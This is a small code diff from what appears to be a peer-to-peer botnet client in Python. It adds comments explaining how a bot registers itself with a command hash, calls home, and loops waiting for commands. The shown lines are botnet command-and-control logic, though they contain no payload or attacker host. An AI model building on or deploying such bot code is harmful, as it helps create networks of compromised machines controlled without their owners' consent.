@@ -185,6 +185,7 @@ Next its going to callhome()
 """
 async def setup(server):
     myip = get_ip_address()
+    # the UUID for bot to check if commands are ready, is a hash of the node_id. 
     cmdhash = get_hash(str(server.node.long_id))
     #Create botnode with Its IP, Port, Bot ID, and command hash
     bot = botnode(myip, myport, str(server.node.long_id), cmdhash)
@@ -194,6 +195,7 @@ async def setup(server):
     #print("\nBOT CREATED?: CHECK THESE VARS:\n{}\n\n".format(vars(bot)))
     #pdb.set_trace()
     await callhome(server, bot)
+    # Once callhome returns successfully then the populated bot class will be returned. Allows driving event loop to keep track of information on the bot
     return bot
 
 
@@ -240,7 +242,7 @@ try:
         loop_counter+=1
         print("Started a new loop numer:\n{}".format(loop_counter))
         #bot.listVars()
-        loop.run_until_complete(wait_cmd(server, bot))# loop.call_soon_threadsafe() #If we on the network wait for a command; Tried asyncio.ensure_furture(wait_cmd())
+        loop.run_until_complete(wait_cmd(server, bot)) #If we on the network wait for a command;
         asyncio.sleep(1)
     loop.run_forever()
 except KeyboardInterrupt:
